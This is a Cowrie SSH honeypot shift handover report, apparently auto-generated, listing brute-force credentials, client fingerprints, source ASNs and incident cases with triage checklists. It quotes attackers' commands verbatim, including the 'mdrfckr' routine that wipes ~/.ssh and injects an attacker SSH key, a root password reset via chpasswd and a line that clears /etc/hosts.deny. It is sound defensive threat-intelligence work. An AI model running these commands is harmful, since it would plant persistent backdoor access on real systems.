# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T13:10:03Z |
| **Shift Time** | 13:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **175** |
| Confirmed Threats | **169** |
| False Positives Filtered | **6** (3.4%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **11** |
| High Severity Cases | **50** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **125** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **134** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **24** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **32** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 51 |
| `345gs5662d34` | 23 |
| `ubuntu` | 12 |
| `user` | 5 |
| `oracle` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 24 |
| `345gs5662d34` | 23 |
| `` | 4 |
| `A12345671` | 3 |
| `12345` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 24 |
| `345gs5662d34` | `345gs5662d34` | 23 |
| `ubuntu` | `A12345671` | 3 |
| `admin1` | `12345` | 3 |
| `root` | `QwertyQwerty123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QwertyQwerty123` | `211.105.129.57` | 2026-04-19T10:44:50 |
| `root` | `3245gs5662d34` | `211.105.129.57` | 2026-04-19T10:44:54 |
| `root` | `Yf123456` | `211.105.129.57` | 2026-04-19T10:48:03 |
| `root` | `Yf123456` | `69.5.20.232` | 2026-04-19T10:49:41 |
| `root` | `3245gs5662d34` | `69.5.20.232` | 2026-04-19T10:49:47 |
| `root` | `exit` | `211.105.129.57` | 2026-04-19T10:51:26 |
| `root` | `!QAZ1qaz` | `123.48.142.249` | 2026-04-19T10:53:17 |
| `root` | `3245gs5662d34` | `123.48.142.249` | 2026-04-19T10:53:21 |
| `root` | `1QWER` | `123.48.142.249` | 2026-04-19T10:56:53 |
| `root` | `QWERTYUIOP@123456` | `69.5.20.232` | 2026-04-19T10:59:38 |
| `root` | `exit` | `123.48.142.249` | 2026-04-19T11:00:19 |
| `root` | `A123456A:` | `69.5.20.232` | 2026-04-19T11:01:36 |
| `root` | `root04` | `123.48.142.249` | 2026-04-19T11:02:08 |
| `root` | `Ab123!@#` | `69.5.20.232` | 2026-04-19T11:05:46 |
| `root` | `Yf123456` | `123.48.142.249` | 2026-04-19T11:07:36 |
| `root` | `root04` | `69.5.20.232` | 2026-04-19T11:07:54 |
| `root` | `1QWER` | `211.105.129.57` | 2026-04-19T11:09:56 |
| `root` | `!QAZ1qaz` | `211.105.129.57` | 2026-04-19T11:13:13 |
| `root` | `QwertyQwerty123` | `123.48.142.249` | 2026-04-19T11:16:22 |
| `root` | `QwertyQwerty123` | `69.5.20.232` | 2026-04-19T11:17:44 |
| `root` | `1QWER` | `69.5.20.232` | 2026-04-19T11:22:14 |
| `root` | `exit` | `69.5.20.232` | 2026-04-19T11:24:26 |
| `root` | `!QAZ1qaz` | `69.5.20.232` | 2026-04-19T11:28:50 |
| `root` | `Root654321#` | `180.76.115.202` | 2026-04-19T12:28:16 |
| `root` | `qqww1122` | `14.103.108.102` | 2026-04-19T12:33:19 |
| `root` | `3245gs5662d34` | `14.103.108.102` | 2026-04-19T12:33:28 |
| `root` | `Qwerty1234@` | `14.103.108.102` | 2026-04-19T12:39:42 |
| `root` | `Cl123456@` | `118.122.147.195` | 2026-04-19T13:01:32 |
| `root` | `Linux123!@#` | `201.76.120.30` | 2026-04-19T13:02:01 |
| `root` | `3245gs5662d34` | `201.76.120.30` | 2026-04-19T13:02:08 |
| `root` | `ccBB111` | `122.176.122.24` | 2026-04-19T13:03:37 |
| `root` | `3245gs5662d34` | `122.176.122.24` | 2026-04-19T13:03:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **175** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 147 |
| OpenSSH | 9 |
| Unknown | 1 |
| Paramiko (Python) | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 143 | 10 |
| `c118de82e19e...` | Mirai/variant | 9 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 143 | 10 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ubMR8kdN5z6a"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.122.147.195`, `180.76.115.202`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.5.20.232`, `211.105.129.57`, `123.48.142.249`, `122.176.122.24`, `14.103.108.102`, `201.76.120.30`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **20** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS18126` | Chubu Telecommunications Company, Inc. | 1 | HIGH |
| `AS18129` | OKAYAMA NETWORK INC. | 1 | MEDIUM |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS9506` | Singtel Fibre Broadband | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ffd7aa991e72

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:44 |
| **Last Seen** | 2026-04-19 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:44:50` | `cowrie.session.connect` |
| `2026-04-19 10:44:50` | `cowrie.client.version` |
| `2026-04-19 10:44:50` | `cowrie.client.kex` |
| `2026-04-19 10:44:50` | `cowrie.login.success` |
| `2026-04-19 10:44:51` | `cowrie.session.params` |
| `2026-04-19 10:44:51` | `cowrie.command.input` |
| `2026-04-19 10:44:51` | `cowrie.command.failed` |
| `2026-04-19 10:44:51` | `cowrie.log.closed` |
| `2026-04-19 10:44:51` | `cowrie.session.params` |
| `2026-04-19 10:44:51` | `cowrie.command.input` |
| `2026-04-19 10:44:51` | `cowrie.session.file_download` |
| `2026-04-19 10:44:51` | `cowrie.log.closed` |
| `2026-04-19 10:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-312712c967b6

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:44 |
| **Last Seen** | 2026-04-19 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:44:54` | `cowrie.session.connect` |
| `2026-04-19 10:44:54` | `cowrie.client.version` |
| `2026-04-19 10:44:54` | `cowrie.client.kex` |
| `2026-04-19 10:44:54` | `cowrie.login.success` |
| `2026-04-19 10:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b835c97caaf6

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:48 |
| **Last Seen** | 2026-04-19 10:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:48:02` | `cowrie.session.connect` |
| `2026-04-19 10:48:02` | `cowrie.client.version` |
| `2026-04-19 10:48:02` | `cowrie.client.kex` |
| `2026-04-19 10:48:03` | `cowrie.login.success` |
| `2026-04-19 10:48:03` | `cowrie.session.params` |
| `2026-04-19 10:48:03` | `cowrie.command.input` |
| `2026-04-19 10:48:03` | `cowrie.command.failed` |
| `2026-04-19 10:48:04` | `cowrie.log.closed` |
| `2026-04-19 10:48:04` | `cowrie.session.params` |
| `2026-04-19 10:48:04` | `cowrie.command.input` |
| `2026-04-19 10:48:04` | `cowrie.session.file_download` |
| `2026-04-19 10:48:04` | `cowrie.log.closed` |
| `2026-04-19 10:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42976df45c60

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:48 |
| **Last Seen** | 2026-04-19 10:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:48:06` | `cowrie.session.connect` |
| `2026-04-19 10:48:06` | `cowrie.client.version` |
| `2026-04-19 10:48:06` | `cowrie.client.kex` |
| `2026-04-19 10:48:07` | `cowrie.login.success` |
| `2026-04-19 10:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d12bcf5a02b

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 10:49 |
| **Last Seen** | 2026-04-19 10:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:49:39` | `cowrie.session.connect` |
| `2026-04-19 10:49:39` | `cowrie.client.version` |
| `2026-04-19 10:49:40` | `cowrie.client.kex` |
| `2026-04-19 10:49:41` | `cowrie.login.success` |
| `2026-04-19 10:49:41` | `cowrie.session.params` |
| `2026-04-19 10:49:41` | `cowrie.command.input` |
| `2026-04-19 10:49:41` | `cowrie.command.failed` |
| `2026-04-19 10:49:41` | `cowrie.log.closed` |
| `2026-04-19 10:49:42` | `cowrie.session.params` |
| `2026-04-19 10:49:42` | `cowrie.command.input` |
| `2026-04-19 10:49:42` | `cowrie.session.file_download` |
| `2026-04-19 10:49:42` | `cowrie.log.closed` |
| `2026-04-19 10:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4bc1e21232

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 10:49 |
| **Last Seen** | 2026-04-19 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:49:46` | `cowrie.session.connect` |
| `2026-04-19 10:49:46` | `cowrie.client.version` |
| `2026-04-19 10:49:47` | `cowrie.client.kex` |
| `2026-04-19 10:49:47` | `cowrie.login.success` |
| `2026-04-19 10:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1cb8046408

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:51 |
| **Last Seen** | 2026-04-19 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:51:25` | `cowrie.session.connect` |
| `2026-04-19 10:51:25` | `cowrie.client.version` |
| `2026-04-19 10:51:25` | `cowrie.client.kex` |
| `2026-04-19 10:51:26` | `cowrie.login.success` |
| `2026-04-19 10:51:26` | `cowrie.session.params` |
| `2026-04-19 10:51:26` | `cowrie.command.input` |
| `2026-04-19 10:51:26` | `cowrie.command.failed` |
| `2026-04-19 10:51:26` | `cowrie.log.closed` |
| `2026-04-19 10:51:27` | `cowrie.session.params` |
| `2026-04-19 10:51:27` | `cowrie.command.input` |
| `2026-04-19 10:51:27` | `cowrie.session.file_download` |
| `2026-04-19 10:51:27` | `cowrie.log.closed` |
| `2026-04-19 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe1b8c6927f

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 10:51 |
| **Last Seen** | 2026-04-19 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:51:29` | `cowrie.session.connect` |
| `2026-04-19 10:51:29` | `cowrie.client.version` |
| `2026-04-19 10:51:29` | `cowrie.client.kex` |
| `2026-04-19 10:51:30` | `cowrie.login.success` |
| `2026-04-19 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e585f82e54f2

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 10:53 |
| **Last Seen** | 2026-04-19 10:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:53:16` | `cowrie.session.connect` |
| `2026-04-19 10:53:16` | `cowrie.client.version` |
| `2026-04-19 10:53:16` | `cowrie.client.kex` |
| `2026-04-19 10:53:17` | `cowrie.login.success` |
| `2026-04-19 10:53:17` | `cowrie.session.params` |
| `2026-04-19 10:53:17` | `cowrie.command.input` |
| `2026-04-19 10:53:17` | `cowrie.command.failed` |
| `2026-04-19 10:53:17` | `cowrie.log.closed` |
| `2026-04-19 10:53:18` | `cowrie.session.params` |
| `2026-04-19 10:53:18` | `cowrie.command.input` |
| `2026-04-19 10:53:18` | `cowrie.session.file_download` |
| `2026-04-19 10:53:18` | `cowrie.log.closed` |
| `2026-04-19 10:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7958d79dd15c

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 10:53 |
| **Last Seen** | 2026-04-19 10:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:53:20` | `cowrie.session.connect` |
| `2026-04-19 10:53:20` | `cowrie.client.version` |
| `2026-04-19 10:53:20` | `cowrie.client.kex` |
| `2026-04-19 10:53:21` | `cowrie.login.success` |
| `2026-04-19 10:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4dffc162fd

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 10:56 |
| **Last Seen** | 2026-04-19 10:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:56:52` | `cowrie.session.connect` |
| `2026-04-19 10:56:52` | `cowrie.client.version` |
| `2026-04-19 10:56:53` | `cowrie.client.kex` |
| `2026-04-19 10:56:53` | `cowrie.login.success` |
| `2026-04-19 10:56:53` | `cowrie.session.params` |
| `2026-04-19 10:56:53` | `cowrie.command.input` |
| `2026-04-19 10:56:53` | `cowrie.command.failed` |
| `2026-04-19 10:56:54` | `cowrie.log.closed` |
| `2026-04-19 10:56:54` | `cowrie.session.params` |
| `2026-04-19 10:56:54` | `cowrie.command.input` |
| `2026-04-19 10:56:54` | `cowrie.session.file_download` |
| `2026-04-19 10:56:54` | `cowrie.log.closed` |
| `2026-04-19 10:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
